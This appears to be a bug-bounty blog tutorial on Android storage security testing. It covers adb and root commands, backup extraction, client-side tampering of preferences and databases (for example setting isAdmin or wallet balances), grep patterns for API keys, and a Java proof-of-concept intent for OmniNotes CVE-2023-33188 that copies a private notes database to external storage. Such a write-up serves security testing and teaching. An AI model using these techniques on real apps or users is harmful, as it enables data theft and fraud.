# Inside Android’s Storage

- **Source URL:** https://medium.com/@mohaba746/inside-androids-storage-24ef44b71c0f
- **Fetched from:** https://medium.com/feed/@mohaba746
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14996 (id 14996)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
You install a note-taking app. You never root your phone, You follow every security best-practice. Yet a malicious app sitting quietly on your device and can still read every note you’ve ever written. This isn’t a hypothetical — it’s ***CVE-2023–33188***.

But before we get into how that attack actually works, we need to cover a few fundamentals of Android storage. Once you understand where apps keep data and why some of it isn’t as protected as developers assume, the vulnerabilities — and the CVE — will make a lot more sense.

Let’s start by understanding where that data actually lives, and why not all of it is protected equally.

### 1. Internal Storage

Every app gets its own private directory at /data/data/\<package>/, sandboxed by UID — only the owning app can read it. On a non-rooted device, browsing it returns "Permission denied."

Everything covered so far (SharedPreferences, SQLite databases, cache) lives somewhere under this directory.

#### **How to check**

\# With root:

adb shell

su

ls -l /data/data/\<package>/

# Without root, if the app is debuggable:

adb shell run-as \<package> ls -l

### 2. Files Directory (/files)

General-purpose private storage — commonly holds message histories, exported data, downloaded media, logs, or serialized objects. Not cleared automatically; persists until the app deletes it or is uninstalled, unlike cache.

A .profile file may appear automatically — Android-generated, not app data, safe to ignore.

#### **How to test**

adb shell

su

ls -la /data/data/\<package>/files/

Pull and inspect anything that looks sensitive:

adb pull /data/data/\<package>/files/ ./files\_dump/

#### **What to look for**

- Exported files (PDFs, images, chat logs) containing personal data
- Serialized objects (.ser, .dat) that might hold session state or credentials
- Any file left behind from a debug/export feature the developer forgot to clean up

#### **Static confirmation (jadx)**

Search for:

getFilesDir()

openFileOutput(

FileOutputStream(

Check what’s written, with what permissions mode (MODE\_PRIVATE vs MODE\_WORLD\_READABLE), and whether it's ever deleted.

### 3. Sensitive Data in Shared Preferences

Simple key-value store, backed by an XML file in /data/data/\<package>/shared\_prefs/. Despite the name, not shared between apps — only shared across threads/processes of the same app.

#### **Why it’s a vulnerability**

- Frequently used/misused to store API keys, tokens, passwords, and trust flags (isAdmin, isPremium).
- The file is plaintext — anyone with root, or via backup extraction (allowBackup="true"), can read it without needing to break any encryption.

#### **How to test**

1. Use the app so it writes data (login, enable “Remember me”, change a setting).
2. Read the files:

adb shell

su

cd /data/data/\<package>/shared\_prefs/

ls -l

cat \*.xml

# If not rooted but the app is debuggable:

adb shell run-as \<package> cat shared\_prefs/\<file>.xml

#### **What to look for**

- Keywords: token, password, session, auth, email, card
- Base64 or JWT values (starting with eyJ) — decode and inspect, Base64 isn't encryption
- Trust/role flags: isAdmin, isPremium, isLoggedIn

#### **Static confirmation (jadx)**

Search for:

getSharedPreferences()

getDefaultSharedPreferences()

putString()

Check what value is being stored and where it comes from.

#### **Tampering (separate test)**

The XML can be edited directly: pull → edit → push back. Changes often aren’t picked up until the app restarts, because Android caches preference values in memory — so force-stop the app before pushing, then relaunch. After pushing, fix file ownership/SELinux context or the app may fail to read it:

chown \<app\_uid>:\<app\_uid> file.xml

chmod 660 file.xml

restorecon file.xml

Try flipping values like isAdmin=true or isPremium=true to see if the app trusts client-side state without server validation.

### 4. Internal Databases (SQLite)

- The app stores data in /data/data/\<package>/databases/ folder, Why it may lead to a vulnerability?
- The normal .db files stored as plain text, so anyone with root/backup (allowBackup="true") can open it and read everything: messages, user data, tokens.

#### How to test?

1\. use the app to write data in the database (login, chat, etc…) then see the files:

adb shell

su

ls -l /data/data/\<package>/databases/

# mostly u will find this files:

app.db app.db-wal app.db-shm app.db-journal

*Note: Always pull all of them, not only the .db. The -wal file can hold recent data not yet written to the main file.*

2\. Pull & Open them all:

adb pull /data/data/\<package>/databases/ ./dbs/

sqlite3 app.db

|

.tables .schema

SELECT \* FROM users;

3\. To know if data is encrypted or not:

|-> SQLite format 3 -> plain text

head -c 16 app.db |

|-> Random bytes -> SQLCipher

- If encrypted check this: [SQLCipher](https://app.notion.com/p/SQLCipher-41dc2c7a6f528004bfd0ecb73d711632?pvs=21)

#### What to look for?

- Column names: password, token, email, phone, card, message.
- Session tables and API cache tables.
- Base64 values (not encrypted) & weak hashes (MD5 / SHA1 without salt).

#### Static confirmation (jadx)

Search for:

openOrCreateDatabase

SQLiteOpenHelper

Room.databaseBuilder

net.sqlcipher

SupportFactory

- The first 3 confirm plain SQLite; the last 2 mean the db is encrypted via SQLCipher and if so, the question is where the passphrase comes from.

#### Tampering (separate test)

- Edit data and see if the app trusts it:

UPDATE users SET role='admin' WHERE id=1;

UPDATE wallet SET balance=999999;

- Procedure: force-stop → push → fix owner → relaunch.

### 5. Sensitive Data in Cache / Temp Files

Apps use temporary folders for short-lived files:

/data/data/\<package>/cache/

/data/data/\<package>/code\_cache/

getCacheDir()

getExternalCacheDir()

#### Why it may lead to a vulnerability?

- Developers treat cache as “temporary” and often forget to delete it — but files can stay for days until the system decides to reclaim space.
- Accessible via root or backup extraction, just like internal storage.
- Sometimes ends up in getExternalCacheDir() instead of internal, inheriting the same risks as External Storage.

#### **How to test**

**1.** Generate cache activity (open PDF, upload image) then Check contents:

adb shell

su

ls -la /data/data/\<package>/cache/

ls -la /data/data/\<package>/code\_cache/

find /sdcard/Android/data/\<package>/cache/ -type f

2\. Pull and inspect anything suspicious:

adb pull /data/data/\<package>/cache/ ./cache\_dump/

#### **What to look for**

- PDFs/images with personal data opened temporarily
- .json/.tmp files with full API responses or tokens
- Thumbnails of sensitive images deleted elsewhere but still cached
- WebView cache specifically — overlaps with this category

#### **Static confirmation (jadx)**

Search for:

getCacheDir()

getExternalCacheDir()

File.createTempFile(

.cache

Check what’s written there, and whether it’s deleted use (file.delete() missing = finding).

**Common pattern: attachments opened via WebView/Intent**

```
File tempFile = File.createTempFile("attachment", ".pdf", context.getCacheDir());
// opened via Intent or WebView — but no deleteOnExit() or cleanup after
```
Very common in banking and messaging apps — worth searching for specifically.

### 6. Sensitive Data in External Storage (SD Card)

External storage is not /data/data/\<package>/. It's public storage with an app-specific path like: /sdcard/Android/data/\<package>/

Apps use it for images, videos, PDFs, logs, or backups.

#### Why it may lead to a vulnerability?

- Unlike internal storage, external storage isn’t protected by the app sandbox the same way.
- Pre-Android 10, any app with READ\_EXTERNAL\_STORAGE could read another app's files here without root.
- Android 10+ introduced ***Scoped Storage*** but it can still be bypassed if app requests MANAGE\_EXTERNAL\_STORAGE/ uses getExternalStorageDirectory().
- Sensitive data here is far less protected than in /data/data.

#### **How to test**

1\. Use the app normally (upload an image, export a file) and Check the paths — no root needed:

adb shell

ls -l /sdcard/Android/data/\<package>/

ls -l /sdcard/Android/media/\<package>/

find /sdcard -iname "\*\<package\_keyword>\*"

2\. Pull anything suspicious:

adb pull /sdcard/Android/data/\<package>/ ./external/

#### **What to look for**

- .jpg / .pdf files containing personal data (ID photos, contracts)
- .log / .txt files with tokens or error traces
- DB backups or cache files mistakenly placed here instead of /data/data
- Files named config, debug, backup

#### **Static confirmation (jadx)**

Search for:

getExternalFilesDir()

getExternalStorageDirectory()

Environment.getExternalStoragePublicDirectory()

Check what’s written there and where the data comes from.

### 7. World-Readable / World-Writable Files

It’s about file permissions, not location — applies anywhere a file lives (internal or external).

Standard permission string: rw-rw-rw-; last 3 characters are for "others" — rw- there means any other app can read/write with no special permission.

#### **Why it’s a vulnerability**

- Old API: openFileOutput("file", Context.MODE\_WORLD\_READABLE) — removed since API 24, but can still appear in legacy code.
- If used, any other app (or malware) can read the file with no root and no permission required — worse than the external storage issue, since it breaks the basic app sandbox itself.

#### **How to test**

adb shell

run-as \<package>

find /data/data/\<package>/ -type f -exec ls -l {} \;

# With root:

find /data/data/\<package>/ -perm -o+r -type f # world-readable

find /data/data/\<package>/ -perm -o+w -type f # world-writable

Also check external storage paths for the same issue.

#### **What to look for**

- Any file with r or w set in the "others" permission field
- Files/folders left with chmod 777 from debugging code
- SharedPreferences or DB files with manually (and incorrectly) modified permissions

#### **Static confirmation (jadx)**

Search for:

MODE\_WORLD\_READABLE                                             \<------|

MODE\_WORLD\_WRITEABLE |

Runtime.exec("chmod |

setReadable(true, false) |

# 2nd false means "readable by everyone, not just the owner" Same as: -|

setWritable(true, false)

### 8. android:allowBackup=”true” (Backup Extraction)

Manifest attribute, defaults to true if missing entirely. If true Android allows a full app data backup via adb backup, no root required — only USB debugging enabled.

#### **Why it’s a vulnerability**

The backup captures nearly everything in /data/data/\<package>/— making every other storage-based finding reachable without root.

#### **How to check**

apktool d app.apk

cat app/AndroidManifest.xml | grep allowBackup

|

------------------------------------------------

| | |

true false Missing

| | |

vulnerable protected against defaults to true,

this attack easy to miss

#### **Exploitation** steps

adb devices

adb backup -f backup.ab -noapk \<package> # Create the backup:

Convert the .ab file with Android Backup Extractor:

java -jar abe.jar unpack backup.ab backup.tar

tar -xvf backup.tar

Extracted folder structure:

apps/\<package>/sp/   → SharedPreferences

apps/\<package>/db/ → SQLite databases

apps/\<package>/f/ → Files

Apply all previous checks (grep for tokens, open DBs with sqlite3, etc.) on these files.

**Note:** not everything gets backed up

- some file types are excluded automatically
- android:fullBackupContent lets developers exclude paths. So, If present check the file it points to, to see if it excludes sensitive data.

### 9. Hardcoded Secrets / API Keys

Developers sometimes embed API keys, tokens, passwords directly as strings in code instead of fetching them securely at runtime:

String apiKey = "AIzaSyD4f8h3k9...";

String dbPassword = "MySecretPass123";

#### **Why it’s a vulnerability**

Any APK can be easily decompiled, so a hardcoded string becomes visible to everyone. **Depending on what it is:**

Paid API key → attacker racks up usage/costs, a JWT signing secret → forged tokens, encryption key → decrypted data, and direct DB credentials → full backend access.

**Static testing (jadx)**

jadx -d output/ app.apk   # Decompile the apk

grep -rEi "api\[\_-\]?key|secret|password|token|access\[\_-\]?key" output/ --include="\*.java"

grep -rE "AIza\[0-9A-Za-z\-\_\]{35}" output/ # Google API key

grep -rE "AKIA\[0-9A-Z\]{16}" output/ # AWS Access Key

grep -rE "sk\_live\_\[0-9a-zA-Z\]{24,}" output/ # Stripe secret

grep -rE "eyJ\[A-Za-z0-9\_-\]+\.\[A-Za-z0-9\_-\]+\.\[A-Za-z0-9\_-\]+" output/ # Static JWT

Also check res/values/strings.xml, assets/, and BuildConfig.java (keys sometimes get injected here at build time).

Tools like trufflehog and apkleaks automate this detection and save time over manual grep.

**Prove the key is live :** A string alone isn’t enough — confirm it actually works, or the report gets closed as informational. Make a real request with it (API key), forge and send a token (JWT secret), or attempt a direct connection within scope (DB credentials).

***Not every key is a serious finding***

### 10. Sensitive Data in Logcat

Anything logged via Log.d(), Log.e(), System.out.println() goes into a centralized buffer, not just within the app itself.

#### **Why it’s a vulnerability**

Pre-Android 4.1, any app with READ\_LOGS permission could read other apps' logs without root. API 16+ locked this down unless the device is rooted or you're connected via adb.

The real issue: developers often forget to strip debug logs before shipping. If the app logs Log.d("Auth", "token=" + token), anyone with adb access can watch it live.

#### **How to test**

adb logcat -c                       # clear old buffer

adb logcat | grep -i \<package> # filter by package

# or capture everything to a file

adb logcat > log.txt

Use the app normally (login, enter card details), then search for: password, token, auth, session, card, otp, secret

***pidcat gives colorized, filtered output for a single app — easier than raw*** ***adb logcat.***

#### **Static confirmation (jadx)**

Search for:

Log.d(   Log.e(   Log.i(   Log.v(   Log.w(

System.out.println(

printStackTrace()

Check what’s being logged, especially in login/auth code, API response handling, and exception handlers.

### 11. Remaining Findings — Quick Summary

Check this [link](https://app.notion.com/p/Remaining-Findings-Quick-Summary-41fc2c7a6f52809aa92cd503e0f4aa7f?source=copy_link).

Now it comes to the topic of the writeup:

### OmniNotes CVE-2023–33188

**App:** OmniNotes v6.2.5 (note-taking app)

**Bug class:** Missing path validation on an externally-supplied Intent → internal file disclosure via copy-to-external-storage

#### How notes are normally stored

OmniNotes keeps notes in a SQLite database at: /data/data/it.feio.android.omninotes/databases/omni\_notes

Tables include notes, attachments, categories. Attachment file paths point into the app's **external** storage directory (/sdcard/Android/data/it.feio.android.omninotes/...).

### The vulnerability

OmniNotes accepts ACTION\_SEND intents from other apps (e.g., "share a photo to OmniNotes") and will copy the referenced file into its own external attachment folder — but it did **not** validate that the supplied URI/path was actually something safe to copy.

Since OmniNotes itself has full access to its own private **internal** storage, a malicious app can supply an internal file path and trick OmniNotes into copying that internal file out to its (semi-public) external directory.

### Exploit flow

1\. A malicious app crafts an Intent with:

- action = ACTION\_SEND, type = image/\* , EXTRA\_TEXT = arbitrary note text
- EXTRA\_STREAM = a file:// URI pointing at OmniNotes' **internal** database file

2\. startActivity(intent) is called — no user interaction with OmniNotes' own UI is required.

3\. OmniNotes copies the referenced file into its external files/ directory, without checking that it was a legitimate attachment.

4\. The copied file is now sitting in the semi-public external storage path.

5\. The malicious app with external storage read permission (on vulnerable Android versions) can read that copied database and extract the notes.

#### **Minimal PoC intent (Java), triggering the malicious copy:**

Intent intent = new Intent();

intent.setAction(Intent.ACTION\_SEND);

intent.setType("image/\*");

intent.putExtra(Intent.EXTRA\_TEXT, "Malicious note");

intent.putExtra(

Intent.EXTRA\_STREAM,

Uri.parse("file:///data/data/it.feio.android.omninotes/databases/omni\_notes")

);

intent.setClassName(

"it.feio.android.omninotes",

"it.feio.android.omninotes.MainActivity"

);

startActivity(intent);

#### Why Android version matters here

- **Pre android 10:** only READ\_EXTERNAL\_STORAGE / WRITE\_EXTERNAL\_STORAGE are needed to read the copied file.
- **Android 11+ (scoped storage enforced):** attacker would need MANAGE\_EXTERNAL\_STORAGE — but even that permission doesn’t grant access to other apps' /sdcard/Android/\<package>/ directories, so the data-theft half of the attack is effectively blocked.
- **Permissions a stealer app needs to read the copied file (Android ≤10, legacy model):**

\<uses-permission android:name="android.permission.READ\_EXTERNAL\_STORAGE" />

\<uses-permission android:name="android.permission.WRITE\_EXTERNAL\_STORAGE" />

On Android 11+ these permissions alone aren’t enough — scoped storage blocks this legacy approach, as noted above.

#### Mobile Storage Hacking Methodology — The Complete Mind Map

MOBILE STORAGE HACKING

├── 1. INTERNAL STORAGE (/data/data/\<package>/)

│ │

│ ├── Shared Preferences

│ │ ├── Tokens / passwords / trust flags

│ │ ├── Plaintext XML

│ │ └── Tampering (isAdmin, isPremium)

│ │

│ ├── SQLite / Room / Realm Databases

│ │ ├── Plaintext check (SQLite format 3)

│ │ ├── SQLCipher key tracing

│ │ ├── android\_metadata ≠ app data

│ │ └── Tampering (UPDATE role='admin')

│ │

│ ├── Files Directory (/files)

│ │ ├── Exported data

│ │ ├── Serialized objects

│ │ └── Debug leftovers

│ │

│ └── Cache / Temp Files

│ ├── WebView-opened attachments

│ ├── Cached API responses

│ └── Deleted after use?

│

├── 2. EXTERNAL STORAGE (/sdcard/)

│ ├── App-specific external paths

│ ├── Scoped Storage bypass (legacy APIs)

│ ├── MANAGE\_EXTERNAL\_STORAGE

│ └── Misplaced DBs / backups / logs

│

├── 3. FILE & DATA EXPOSURE

│ │

│ ├── World-Readable / World-Writable Files

│ │ ├── Permission bits (others: r/w)

│ │ ├── MODE\_WORLD\_READABLE (legacy)

│ │ └── Cross-app PoC (no root)

│ │

│ └── Backup Extraction (allowBackup)

│ ├── Manifest default = true

│ ├── adb backup / abe extraction

│ └── fullBackupContent exclusions

│

├── 4. SECRETS & CRYPTO

│ │

│ ├── Hardcoded Secrets / API Keys

│ │ ├── grep known key patterns

│ │ ├── strings.xml / assets / BuildConfig

│ │ └── Prove the key is live

│ │

│ └── Keystore Misuse or Not Used

│ ├── No Keystore at all

│ ├── ECB / weak padding

│ ├── Missing user auth requirement

│ └── Frida — Cipher.doFinal hook

│

├── 5. RUNTIME LEAKAGE

│ │

│ ├── Logcat

│ │ ├── Debug logs in production

│ │ ├── Third-party logging (OkHttp Level.BODY)

│ │ └── Exception stack traces

│ │

│ ├── Clipboard

│ ├── Screenshots / Recent Apps (FLAG\_SECURE)

│ ├── Keyboard Cache (inputType)

│ └── WebView Cache / Cookies

│

└── 6. CHAINING INTO IMPACT

│

└── Untrusted Input → Storage Trust

├── Intent data not validated (OmniNotes CVE-2023-33188)

├── Internal file disclosed via Intent abuse

└── Combine 2+ findings into real exploitation

So the point here is: developers assume private storage is safe, and forget how easily that boundary gets crossed — root, backups, a careless Intent, an unprotected key.

OmniNotes proves you don’t even need root; sometimes the app breaks its own sandbox for you.

So for every piece of storage, ask three questions: *where does it live, who else can reach it, and where does the key come from?*

Happy hunting :)
